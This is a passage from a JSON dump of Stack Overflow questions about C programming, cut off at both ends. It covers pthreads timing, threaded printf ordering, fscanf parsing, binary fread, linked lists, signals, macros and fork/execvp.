(val);\n    fps_den = gst_value_get_fraction_denominator (val);\n}\nprintf(\"la taille est de  : %d*%d et la frequence de : %d/%d\", width, height, fps_num, fps_den);\n</code></pre>\n"},{"tags":["c","pthreads","time.h"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13223509,"title":"issues timing the thread functions of pthreads in C","body":"<p>So i am having an issues calculating the elapsed time of the thread function of each thread, I need to be able to find the time total elapsed time for all of the threads but it is not performing this properly. (see output below code)</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include &lt;time.h&gt;\n\nint numthread;\ndouble x1;\ndouble x2;\ndouble h; \ndouble totalintegral;\nint n;              //number of trapezoids\nint localn;\n\ndouble gnolock;\ndouble gmute;\ndouble gbusy;\ndouble gsema;\n\ndouble doTrapRule(double localx1, double localx2, double h, int localn);\ndouble doFunction(double x);\nvoid *threadCalc(void* threadid);\n\nint main(int argc, char * argv[])\n{\n    int i;\n    x1 = 0.0;\n    x2 = 20.0;\n    n = 200000;\n\n    numthread = 10;\n\n    pthread_t* threads = malloc(numthread*sizeof(pthread_t));\n\n    h = (x2 - x1)/n;\n    localn = n/numthread;\n\n    for(i = 0; i &lt; numthread; i++)\n    {\n        pthread_create(&amp;threads[i], NULL, (void *) &amp;threadCalc, (void*) i);\n    }\n\n    for(i = 0; i &lt; numthread; i++)\n    {\n        pthread_join(threads[i], NULL);\n    }\n\n    printf(\"Trap rule result with %d trap(s) is %f\\n\", n, totalintegral);\n    fflush(stdout);\n    printf(\"no lock completed in %f\\n\", gnolock);\n    exit(0);\n}\n\nvoid *threadCalc(void* threadid)\n{\n    clock_t start = clock();\n    double localx1;\n    double localx2; \n    double localintegral;\n    int cur_thread = (int)threadid;\n\n    localx1 = x1 + cur_thread * localn * h;\n    localx2 = localx1 + localn * h;\n\n    localintegral = doTrapRule(localx1, localx2, h, localn);\n\n    totalintegral = totalintegral + localintegral;\n    //printf(\"Trap rule result with %d trap(s) is %f\", n, totalintegral);\n    clock_t stop = clock();\n    double time_elapsed = (long double)(stop - start)/CLOCKS_PER_SEC;\n    printf(\"time elapsed of each thread %f\\n\",time_elapsed);\n    gnolock = gnolock + time_elapsed;\n    return NULL;\n}\n\n\ndouble doTrapRule(double localx1, double localx2, double h, int localn)\n{\n    //time start here\n    double localtrapintegral;\n    double tempx1;\n    int i;\n\n    localtrapintegral = (doFunction(localx1) + doFunction(localx2)) / 2.0;\n\n    for(i = 1; i &lt;= (localn - 1); i++)\n    {\n        tempx1 = localx1 + i * h;\n        localtrapintegral = localtrapintegral + doFunction(tempx1);\n    }\n\n    localtrapintegral = localtrapintegral * h;\n    //time end here, add elapsed to global\n    return localtrapintegral;\n}\n\ndouble doFunction(double x)\n{\n    double result;\n    result = x*x*x;\n\n    return result;\n}\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>time elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.010000\ntime elapsed of each thread 0.010000\ntime elapsed of each thread 0.000000\ntime elapsed of each thread 0.000000\nTrap rule result with 200000 trap(s) is 40000.000001\nno lock completed in 0.020000\n</code></pre>\n\n<p>As you can see for whatever reason only someone of the threads are actually returning a time. I ran this multiple times, and every time only a few threads returned a result. Just as FYI gnolock is my variable that stores the total amount of time elapsed. My guess as to why this isnt working is because the decimal point is out of range, but it shouldnt be?</p>\n"},{"tags":["c","multithreading","posix"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":63,"score":1,"question_id":13223621,"title":"printf doesnt work properly while using threads","body":"<p>hi there a have a little problem with printf while using threads. problem is terminal prints one printf statement a little bit later which should be printed earlier. this is the part where i'm facing with this issue.</p>\n\n<pre><code>.\n.\n.\n        while(1){\n\n        printf(\"waiting for a connection\\n\");\n\n        csock = (int*)malloc(sizeof(int));\n\n        if((*csock = accept( hsock, (struct sockaddr*)&amp;sadr, &amp;addr_size))!= -1){\n            printf(\"---------------------\\nReceived connection from %s\\n\",inet_ntoa(sadr.sin_addr));\n            client_counter++;\n            pthread_create(&amp;thread_id,0,&amp;SocketHandler, (void*)csock );\n        }\n\n        else{\n            fprintf(stderr, \"Error accepting %d\\n\", errno);\n        }\n        }// end while\n.\n.\n.\n</code></pre>\n\n<p>and this is the function which threads' use.</p>\n\n<pre><code>void* SocketHandler(void* lp){\n\n    int *csock = (int*)lp;\n    char buffer[1024];\n    int buffer_len = 1024;\n    int bytecount;\n    char* str_exit=\"exit\";\n\n        while(1){\n\n            memset(buffer, 0, buffer_len);\n\n            if((bytecount = recv(*csock, buffer, buffer_len, 0))== -1){\n            fprintf(stderr, \"Error receiving data %d\\n\", errno);\n            exit(0);\n            }\n\n            if(strcmp(buffer,str_exit)==0){\n                break;\n            }\n\n            printf(\"Received bytes %d\\nReceived string \\\"%s\\\"\\n\", bytecount, buffer);\n            strcat(buffer, \" SERVER ECHO\");\n\n            if((bytecount = send(*csock, buffer, strlen(buffer), 0))== -1){\n            fprintf(stderr, \"Error sending data %d\\n\", errno);\n            exit(0);\n            }\n\n                //printf(\"Sent bytes %d Sent String %s\\n\", bytecount,buffer);\n        }\n\n    printf(\"Client disconnected\\n\");\n    free(csock);\n    return 0;\n}\n</code></pre>\n\n<p>and the output is like this whenever a client (thread) connects to the server.</p>\n\n<pre><code>waiting for a connection\n---------------------\nReceived connection from 127.0.0.1\nwaiting for a connection\nClient disconnected\n---------------------\nReceived connection from 127.0.0.1\nwaiting for a connection\nClient disconnected\n</code></pre>\n\n<p>when the first client connects the output works properly, but when the second one connects the string <code>\"waiting for a connection\"</code> comes after <code>\"Received connection\"</code>. well it should work in contrast way. i will be glad if you can help and thanks anyway</p>\n"},{"tags":["c","pointers","pointer-arithmetic"],"answer_count":8,"favorite_count":5,"up_vote_count":7,"down_vote_count":0,"view_count":8691,"score":7,"question_id":394767,"title":"Pointer Arithmetic","body":"<p>Does anyone have any good articles or explanations (blogs, examples) for pointer arithmetic?  Figure the audience is a bunch of Java programmers learning C and C++.</p>\n"},{"tags":["c","scanf","stdio","fscanf"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":13222257,"title":"fscanf - how to process two floats + whitespace + newline?","body":"<p>Using fscanf I want to process text that contains two floats, an arbitrary amount of whitespace before, between, or after the floats (including newlines/returns), and a newline character at the very end. If there are more/fewer than two numbers, then I want to detect that and report an error.</p>\n\n<p>This seems to work for handling the whitespace, but it won't detect if there's more than two floats present:</p>\n\n<pre><code>fscanf(f, \"%f %f\", &amp;sx, &amp;sy);\n</code></pre>\n\n<p>And this seems to work just as well:</p>\n\n<pre><code>fscanf(f, \"%f %f%*[ \\n\\t\\r\\f\\v]\\n\", &amp;sx, &amp;sy);\n</code></pre>\n\n<p>Is there a better way to handle this?</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":586,"score":4,"question_id":4554351,"title":"Perfect Number In C","body":"<p>I need to write a C program to find the Perfect Number..</p>\n\n<pre><code>main()\n{\n    int n=1000,sum = 0;\n    for(int num = 1; num &lt;= n; num++)\n    {\n        sum = 0;\n        for(int i = 1; i &lt; num; i++)\n        {\n            if(!(num%i))\n            {\n                sum+=i;\n            }\n        }\n        if(sum == num)\n            printf(\"\\n%d\",num);\n    }\n}\n</code></pre>\n\n<p><code>if(!(num%i))</code>  -  This is d line I do not understand.</p>\n\n<p>If there is any other simple method do please suggest me</p>\n"},{"tags":["c","assembly"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":63,"score":4,"question_id":13223525,"title":"Assembly error when compiling a C file under Linux","body":"<p>Hi I am trying to compile simple C programs in my computer and I get the similar msgs from under the terminal [see images] when compiling, stating some sort of assembly error. I dont know if this is a computer memory/stack issue (although I have restarted my computer) or anything else, but what I know for sure is that I have been compiling C programs these past days in the same manner.</p>\n\n<p>Code:</p>\n\n<pre><code>   #include &lt;stdio.h&gt;\n   main(){\n      printf(\"hello\");\n   }\n</code></pre>\n\n<p>Output:</p>\n\n<p>/tmp/cconajAc.s: Assembler messages:\n/tmp/cconajAc.s:9: Error: suffix or operands invalid for `push'</p>\n\n<p>Please tell me how to fix this!</p>\n\n<p><em>EDITED: I have just changed from workstation from another computer lab room and it works alright with no assembly errors whatsoever. My guess would be an error in the development tools installed in those computers in the other lab room. I guess for now this works for me although it would be interesting to know the source of the problem that I had in the other computer.</em></p>\n"},{"tags":["c","fread"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13223666,"title":"C fread not getting entire file","body":"<p>I am trying to read binary files and storing the content into a char array. This function is working great for text files, but for non-text files (a PNG file for example) it does not work as expected. Below is the code followed by the results. What is wrong?</p>\n\n<p>Code:</p>\n\n\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n\nunsigned int readFile(const char *fileName, char **contents);\n\nint main(int argc, char *argv[])\n{\n    char *contents = 0;\n    unsigned int length = readFile(argv[1], &amp;contents);\n\n    fprintf(stderr, \"File length: %d\\r\\n\", length);\n    fprintf(stderr, \"File contents:\\r\\n%s\\r\\n\", contents);\n\n    exit(0);\n}\n\nunsigned int readFile(const char *fileName, char **contents)\n{\n    struct stat stbuf;\n    unsigned int length = 0;\n\n    // Open a file descriptor\n    int fd = open(fileName, O_RDONLY);\n\n    // Check that file descriptor was opened\n    if (fd == -1) {\n        fprintf(stderr, \"Fatal Error: Failed to open the file for fstat (file: %s)!\\r\\n\", fileName);\n        exit(-1);\n    }\n\n    // Get information from fstat\n    if (fstat(fd, &amp;stbuf) == -1) {\n        fprintf(stderr, \"Fatal Error: Failed to find file length (file: %s)!\\r\\n\", fileName);\n        exit(-1);\n    }\n\n    // Store the file length\n    length = stbuf.st_size;\n\n    // Close file descriptor\n    if (close(fd) == -1) {\n        fprintf(stderr, \"Fatal Error: Failed to close file descriptor (file: %s)!\\r\\n\", fileName);\n        exit(-1);\n    }\n\n    // Check if the file contains data\n    if (length &gt; 0) {\n        // Open the file for reading\n        FILE *file = fopen(fileName, \"rb\");\n\n        // Check that the file was opened\n        if (file != NULL) {\n            freopen(fileName, \"rb\", file);\n            // Prepare the contents variable\n            *contents = 0;\n            *contents = (char*)calloc(length + 1, sizeof(char));\n\n            // Read the file and put it in the contents variable\n            int lengthRead = fread(*contents, length, 1, file);\n\n            // Check for file read error\n            if (ferror(file)) {\n                fprintf(stderr, \"Fatal Error: Failed to read file (file: %s)!\\r\\n\", fileName);\n                exit(-1);\n            }\n            else if (lengthRead != 1 || strlen(*contents) &lt; length) {\n                fprintf(stderr, \"Fatal Error: File read error (file: %s)!\\r\\n\", fileName);\n                fprintf(stderr, \"Characters expected: %d, Characters read: %d\\r\\n\", length, strlen(*contents));\n                fprintf(stderr, \"Content read:\\r\\n%s\\r\\n\", *contents);\n                fprintf(stderr, \"Aborting!\\r\\n\", fileName);\n\n                // Close file and exit\n                fclose(file);\n                exit(-1);\n            }\n\n            // Close binary file\n            fclose(file);\n        }\n        else {\n            fprintf(stderr, \"Fatal Error: Failed to open the file: %s!\\r\\n\", fileName);\n            exit(-1);\n        }\n    }\n    else {\n        fprintf(stderr, \"Fatal Error: File was empty (file: %s)!\\r\\n\", fileName);\n        exit(-1);\n    }\n\n    return length;\n}\n</code></pre>\n\n<p>Results:</p>\n\n<pre><code>devious@devious-kubuntu:~/Workspace/test$ ls                                                                                                                                                                                                                                   \ntest  test.c  test.png  test.txt\ndevious@devious-kubuntu:~/Workspace/test$ ./test test.txt \nFile length: 43\nFile contents:\nThis is a test file!\n\nWith multiple lines!\n\ndevious@devious-kubuntu:~/Workspace/test$ ./test test.png \nFatal Error: File read error (file: test.png)!\nCharacters expected: 50243, Characters read: 8\nContent read:\n?PNG\n¦\n\nAborting!\n</code></pre>\n\n<p>I would expect these results if I opened the file in text mode, but since it is opening in binary mode, I do not see why this is happening.</p>\n"},{"tags":["c","linked-list"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":228,"score":0,"question_id":10923211,"title":"C merge two linked lists","body":"<p>I'm trying to copy the contents of two linked lists in one such that one element at a time (from each of the linked lists) is copied.</p>\n\n<p>So, if I have: <code>list1 = [1,2,3]</code>, and <code>list2 = [4,5,6]</code>, the <code>result = [1,4,2,5,3,6]</code>. \nIf one list is shorter than the other then the remaining nodes are appended at the end of the resulted list.</p>\n\n<p>Here's my code, which works with a slight bug: it creates an extra node at the end (which I do not want).</p>\n\n<pre><code>node *list_copy(node *list1, node *list2) \n{\n    node *mylist = newnode(); \n    node *head = mylist;\n\n    while (list1 != NULL || list2 != NULL) {        \n\n        if (list1 != NULL) {\n            mylist-&gt;data = list1-&gt;data;\n            mylist-&gt;next = newnode();\n            mylist = mylist-&gt;next;\n\n            list1 = list1-&gt;next;\n        } \n        if (list2 != NULL) { \n            mylist-&gt;data = list2-&gt;data;\n                mylist-&gt;next = newnode();\n            mylist = mylist-&gt;next;\n\n            list2 = list2-&gt;next;\n        }\n\n    }\n    return head;\n}   \n</code></pre>\n\n<p>How do I modify it such that it doesn't create the last node? </p>\n\n<h3>Example input:</h3>\n\n<pre><code>List1 = [1,2,3], List2 = [1,2,3,4,5,6], Result = [1,1,2,2,3,3,4,5,6,0]; \n</code></pre>\n"},{"tags":["c","struct","segmentation-fault","dynamic-allocation"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13223438,"title":"SegFault in dynamically allocated array of structs, C","body":"<pre><code>typedef struct {\n  double x;\n  double y;\n  long out_x;\n  long out_y;\n} coords;\n\ntypedef struct {\n  char name[FIGURE_LEN + 1];\n  int coordcount, size_tracker;\n  coords *coordinate;\n} fig;\n\nfig figure;\nfig * figpoint;\n</code></pre>\n\n<p>this is the functions that are being called from the parser.c source file.</p>\n\n<pre><code>void initialize_fig(int n, char * name, double x, double y,\n                         fig *fig_point)\n{\n  printf(\"inside function\\n\");\n  strncpy(fig_point[n].name, name, FIGURE_LEN + 1);\n  fig_point[n].size_tracker = 1;\n  fig_point[n].coordinate = malloc(sizeof(coords) * fig_point[n].size_tracker);\n  assert(fig_point[n].coordinate != NULL);\n  fig_point[n].coordcount = 0;\n  fig_point[n].coordinate[fig_point[n].coordcount].x = x;\n  fig_point[n].coordinate[fig_point[n].coordcount].y = y;\n}\n\nvoid create_FigArray(fig * fig_point, int fig_size)\n{\n  fig_point = malloc(sizeof(fig) * fig_size);\n  assert(fig_point != NULL);\n  fig_point = &amp;figure\n}\n</code></pre>\n\n<p>i first call create_FigArray like so...</p>\n\n<pre><code>create_FigArray(fig_point, 16);\n</code></pre>\n\n<p>i get no seg fault here...\nbut then i call...</p>\n\n<pre><code>initialize_fig(0, Qe, 10.0000, 10.0000, fig_point);\n</code></pre>\n\n<p>the parameters are actually passed through variables but i just wanted to show that they are proper parameters and give an example of what values are passed.\nAnyways it hits </p>\n\n<pre><code>strncpy(fig_point[n].name, name, FIGURE_LEN + 1);\n</code></pre>\n\n<p>and stops.. segfault must happen here, but why?!</p>\n\n<p>please help, explain and show how to get around this. thank you.</p>\n"},{"tags":["c","gcc","assembly","architecture","gdb"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13222965,"title":"Why is the my machine decrease the stack pointer by 20 in this code?","body":"<p>I have the following C code compiled with GCC and disassembled to assembly in gdb. I'm using a Macbook pro with 64bit Intel i5 processor. In the 'main()' the 'char* name[2]' has 2 char pointers which should let the stack pointer decrease by 2 words(16 bytes)? However, when I disassembled in gdb it decreases by 20...Can some one help me understand?\nC code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\nint main(void)\n{   \n    char* name[2];\n    name[0] = \"/bin/sh\";\n    name[1]= NULL;\n    execve(name[0],name,NULL);\n}\n</code></pre>\n\n<p>gdb disassembled code:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>GNU gdb 6.3.50-20050815 (Apple version gdb-1708) (Thu Nov  3 21:59:02 UTC 2011)\nCopyright 2004 Free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\nType \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB.  Type \"show warranty\" for details.\nThis GDB was configured as \"x86_64-apple-darwin\"...Reading symbols for shared libraries .. done\n\n(gdb) disassemble main\nDump of assembler code for function main:\n0x0000000100000ee0 &lt;main+0&gt;:    push   %rbp\n0x0000000100000ee1 &lt;main+1&gt;:    mov    %rsp,%rbp\n0x0000000100000ee4 &lt;main+4&gt;:    sub    $0x20,%rsp\n0x0000000100000ee8 &lt;main+8&gt;:    lea    -0x18(%rbp),%rax\n0x0000000100000eec &lt;main+12&gt;:   lea    0x61(%rip),%rcx        # 0x100000f54\n0x0000000100000ef3 &lt;main+19&gt;:   mov    %rcx,-0x18(%rbp)\n0x0000000100000ef7 &lt;main+23&gt;:   movq   $0x0,-0x10(%rbp)\n0x0000000100000eff &lt;main+31&gt;:   mov    -0x18(%rbp),%rcx\n0x0000000100000f03 &lt;main+35&gt;:   mov    $0x0,%rdx\n0x0000000100000f0d &lt;main+45&gt;:   mov    %rcx,%rdi\n0x0000000100000f10 &lt;main+48&gt;:   mov    %rax,%rsi\n0x0000000100000f13 &lt;main+51&gt;:   callq  0x100000f22 &lt;dyld_stub_execve&gt;\n0x0000000100000f18 &lt;main+56&gt;:   mov    -0x4(%rbp),%eax\n0x0000000100000f1b &lt;main+59&gt;:   add    $0x20,%rsp\n0x0000000100000f1f &lt;main+63&gt;:   pop    %rbp\n0x0000000100000f20 &lt;main+64&gt;:   retq   \nEnd of assembler dump.\n</code></pre>\n"},{"tags":["c","signals"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":107,"score":1,"question_id":10907674,"title":"C SIGALARM clarification","body":"<p><em>\"Rewrite 'fgets' to include an alarm so that if after 5 seconds the user doesn't enter any data, 'fgets' will return a pointer to NULL (times out)\"</em></p>\n\n<p>This one problem of a large homework assignment and we only just starting to look at signals, catching, handling, etc.  With that said the book and lecture slides are lacking on this...</p>\n\n<p>I get the idea of creating a handler to catch this type of exception, and I understand how alarm works, but I don't understand how the interface will work.</p>\n\n<p>Just thinking about \"fgets\" right now...  If I simply put an alarm in it prior to all the other work being done (just before my return pointer):</p>\n\n<pre><code>char *fgets(//...//)\n{\n    alarm(5);\n    char * to_return = NULL;\n    //...//\n</code></pre>\n\n<p>If the alarm goes off before the user types in data, can my handler just \"return NULL\"?  Won't execution resume back within \"fgets\" after the handler is done?  I guess I'm confused by what a handler can do inside of a function (ie can it force the function to return some value, can it modify variables that are declared within the function, can it force a jump to a different function call, etc.)</p>\n"},{"tags":["c"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":118,"score":2,"question_id":10908201,"title":"Structures in C programming (initializing statements)","body":"<p>I get the error message \"<strong>error: incompatible types when assigning to type ‘char[10]’ from type ‘char *’ \"</strong>, when trying to initialize name in the following structure: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct info\n{\n  char name[10]; \n  int years;\n};\n\nint main(void){\n  struct info  b;\n\n  b.name = \"Michael\";\n  b.years = 19;\n  return 0 \n;}\n</code></pre>\n"},{"tags":["c","synchronization","mutex","pthreads"],"answer_count":4,"favorite_count":7,"up_vote_count":18,"down_vote_count":0,"view_count":16788,"score":18,"question_id":2065747,"title":"pthreads mutex vs semaphore","body":"<p>What is the difference between semaphores and mutex provided by pthread library ?</p>\n"},{"tags":["c","fork","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13223286,"title":"Multiprocess, Forks and Pipes in C","body":"<p>I posted a question previously about <a href=\"http://stackoverflow.com/questions/13213864/multiprocessing-and-pipes-in-c\">using fork() and pipes in C\n</a>. I changed the design a little bit so that it reads a regular txt file and sorts the words in the file. So far, this is what I came up with:</p>\n\n<pre><code> for (i = 0; i &lt; numberOfProcesses; ++i) {\n    // Create the pipe\n    if (pipe(fd[i]) &lt; 0) {\n      perror(\"pipe error\");\n      exit(1);\n    }\n\n    // fork the child\n    pids[i] = fork();\n    if (pids[i] &lt; 0) {\n      perror(\"fork error\");\n    } else if (pids[i] &gt; 0) {     \n      // Close reading end in parent\n      close(fd[i][0]);\n\n    } else {     \n      // Close writing end in the child\n      close(fd[i][1]);\n\n      int k = 0;\n      char word[30];\n\n      // Read the word from the pipe\n      read(fd[i][0], word, sizeof(word));\n\n      printf(\"[%s]\", word);    &lt;---- **This is for debugging purpose**\n\n     // TODO: Sort the lists  \n    }\n  }\n\n\n  // Open the file, and feed the words to the processes\n  file_to_read = fopen(fileName, \"rd\");\n\n  char read_word[30];\n  child = 0;\n\n  while( !feof(file_to_read) ){\n    // Read each word and send it to the child\n    fscanf(file_to_read,\" %s\",read_word);\n\n    write(fd[child][1], read_word, strlen(read_word));\n    ++child;\n    if(child &gt;= numberOfProcesses){\n      child = 0;\n    }\n  }\n</code></pre>\n\n<p>where <code>numberOfProcesses</code> is a command-line argument. So what it does is that it reads each word in the file and send it to a process. This however, does not work. When I print the word in the child process, it doesn't give me the correct output. Am I writing/reading the words correctly to/from the pipes?</p>\n"},{"tags":["c","unix","gcc","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":169,"score":4,"question_id":10908376,"title":"How to run this program?","body":"<p>I can compile this program which was provided to me, but that I must further develop. I have some questions about it:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n\n#define TIMEOUT (20)\n\nint main(int argc, char *argv[])\n{\n  pid_t pid;\n  if(argc &gt; 1 &amp;&amp; strncmp(argv[1], \"-help\", strlen(argv[1])) == 0)\n    {\n      fprintf(stderr, \"Usage: RunSafe Prog [CommandLineArgs]\\n\\nRunSafe takes as arguments:\\nthe program to be run (Prog) and its command line arguments (CommandLineArgs) (if any)\\n\\nRunSafe will execute Prog with its command line arguments and\\nterminate it and any remaining childprocesses after %d seconds\\n\", TIMEOUT);\n      exit(0);\n    }\n\n  if((pid = fork()) == 0)        /* Fork off child */\n    {\n      execvp(argv[1], argv+1);\n      fprintf(stderr,\"RunSafe failed to execute: %s\\n\",argv[1]);\n      perror(\"Reason\");\n      kill(getppid(),SIGKILL);   /* kill waiting parent */\n      exit(errno);               /* execvp failed, no child - exit immediately */\n    }\n  else if(pid != -1)\n    {\n      sleep(TIMEOUT);\n      if(kill(0,0) == 0)         /* are there processes left? */\n    {\n      fprintf(stderr,\"\\nRunSafe: Attempting to kill remaining (child) processes\\n\");\n      kill(0, SIGKILL);      /* send SIGKILL to all child processes */\n    }\n    }\n  else\n    {\n      fprintf(stderr,\"RunSafe failed to fork off child process\\n\");\n      perror(\"Reason\");\n        }\n\n}\n</code></pre>\n\n<p>What does my warning mean when I compile it?</p>\n\n<pre><code>$ gcc -o RunSafe RunSafe.c -lm \nRunSafe.c: In function ‘main’:\nRunSafe.c:30:44: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]\n</code></pre>\n\n<p>Why can't I execute the file?</p>\n\n<pre><code>$ file RunSafe\nRunSafe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0a128c8d71e16bfde4dbc316bdc329e4860a195f, not stripped\nubuntu@ubuntu:/media/Lexar$ sudo chmod 777 RunSafe\nubuntu@ubuntu:/media/Lexar$ ./RunSafe\nbash: ./RunSafe: Permission denied\nubuntu@ubuntu:/media/Lexar$ sudo ./RunSafe\nsudo: ./RunSafe: command not found\n</code></pre>\n"},{"tags":["c","linux","memory-management","malloc"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":161,"score":1,"question_id":10910557,"title":"Write a function allocate dynamically memory like malloc","body":"<p>How can I implement <code>malloc</code> on a Linux platform?</p>\n"},{"tags":["c","assembly","nasm"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":13207459,"title":"executing assembly code in c","body":"<p>I want to know if there is a way of calling in a .c assembly code?\nI want to put this code in my .c file</p>\n\n<p>The assembly code i want to execute in .c file to return the address</p>\n\n<pre><code>1. mov eax, 0x2d\n2. mov ebx, 0\n3. int 0x80\n</code></pre>\n\n<p>I know the answer is put eax.</p>\n\n<p>This is the part of .c file:</p>\n\n<pre><code>1. void function(void)\n2. {\n3. void *sp;\n4. sp = eax;\n5. fprintf(stderr, \"system break:   %p\\n\", sp);\n6. }\n</code></pre>\n\n<p>How can I do it?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":88,"score":-2,"question_id":10917948,"title":"macro arguments","body":"<p>What will the program print when the inputs are 2,3? </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define min(a,b)  ((a) &gt; (b) ? (b) : (a))\n#define inc(a)    a++\n#define mult(a,b) (a * b)\n\nint main(void) {\n    int x = 1, y = 2;\n    scanf(\"%d %d\",&amp;x,&amp;y);\n    printf(\"min(%d,inc(%d))\",x,y);\n    printf(\"=%d\\n\",min(x,inc(y)));\n    printf(\"min(mult(%d,%d+2),11)\",x,y);\n    printf(\"=%d\\n\",min(mult(x,y+2),11));\n    return 0;\n}\n</code></pre>\n\n<p>edit: I get funny answer for negative numbers i.e <code>-1</code>,<code>-2</code>.<br>\nWhy is <code>inc(-2)</code> change <code>y</code> to zero instead of -1?</p>\n"},{"tags":["c","pointers","typedef"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":10924595,"title":"TypeDefs and Pointers","body":"<p>I'm having a problem with pointers. Basically I have a struct which works as a linked list queue <code>Pcb</code> below.</p>\n\n<pre><code>struct pcb {\n    pid_t pid;             // system process ID\n    char * args[MAXARGS];  // program name and args\n    int arrivaltime;\n    int remainingcputime;\n    struct pcb * next;     // links for Pcb handlers\n    int priority, memalloc, res1, res2, res3, res4, status;\n};\ntypedef struct pcb Pcb;\ntypedef Pcb * PcbPtr;\n</code></pre>\n\n<p>Now you can see I've typedef'ed the <code>Pcb</code> pointer as <code>PcbPtr</code>, meaning that <code>PcbPtr</code> is a pointer right?<br>\nThen I implemented these functions to add a <code>PcbPtr</code> to the queue, depending on its priority:</p>\n\n<pre><code>PcbPtr enqPcb(PcbPtr headofQ, PcbPtr process){\n    PcbPtr c = headofQ;\n    if (!headofQ) {\n        headofQ = process;\n        return headofQ;\n    }\n    while (c-&gt;next) {\n        c = c-&gt;next;\n    }\n    c-&gt;next = process;\n    return headofQ;\n}\n\nvoid priEnq(PcbPtr f1, PcbPtr f2, PcbPtr f3, PcbPtr a) {\n    int pri = a-&gt;priority;\n    if (pri == 3)\n        enqPcb(f3, a);\n    else if(pri == 2)\n        enqPcb(f2, a);\n    else \n        enqPcb(f1, a);\n    return;\n}\n</code></pre>\n\n<p>but it's not changing the object I'm pointing to (i.e. <code>headf1</code> in this case:)</p>\n\n<pre><code>PcbPtr headi;\nPcbPtr headf1; //priority 1\nPcbPtr headf2; //priority 2\nPcbPtr headf3; //priority 3\n...\npriEnq(headf1, headf2, headf3, headi);\n</code></pre>\n\n<p>so its as if I'm passing another object as the parameter. When I don't use <code>priEnq()</code>, it adds to the list just fine.</p>\n\n<p>Any ideas what I'm doing wrong? Any help is much appreciated</p>\n\n<h3>SOLVED:</h3>\n\n<pre><code>PcbPtr enqPcb(PcbPtr *headofQ, PcbPtr process){\n    PcbPtr c = *headofQ;\n    PcbPtr d = c;\n    if (!*headofQ) {\n        *headofQ = process;\n        return *headofQ;\n    }\n    while (c-&gt;next) {\n        c = c-&gt;next;\n    }\n    c-&gt;next = process;\n    return headofQ;\n}\n\nvoid priEnq(PcbPtr *f1, PcbPtr *f2, PcbPtr *f3, PcbPtr a) {\n    int pri = a-&gt;priority;\n    if (pri == 3)\n        enqPcb(f3, a);\n    else if(pri == 2)\n        enqPcb(f2, a);\n    else \n        enqPcb(f1, a);\n    return;\n}\n\nPcbPtr headi;\nPcbPtr headf1; //priority 1\nPcbPtr headf2; //priority 2\nPcbPtr headf3; //priority 3\n...\npriEnq(&amp;headf1, &amp;headf2, &amp;headf3, headi);\n</code></pre>\n"},{"tags":["c","linux","smtp","dns"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":5443,"score":1,"question_id":1128409,"title":"How might I perform DNS lookups using C/C++ on Linux?","body":"<p>How do I get similar functionality to the <code>host</code> command using a c api (or any other language for that matter)? I need more information than just an IP address given by <code>gethostbyname()</code>; specifically, the SMTP-related data.</p>\n"},{"tags":["c","fork","execvp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":10925921,"title":"fork() and execvp()","body":"<p>I'm having problems trying to execute a process using <code>fork()</code> and <code>execvp()</code>. I have a struct <code>Pcb</code> which has an array of arguments (<code>args</code>):</p>\n\n<pre><code>#define 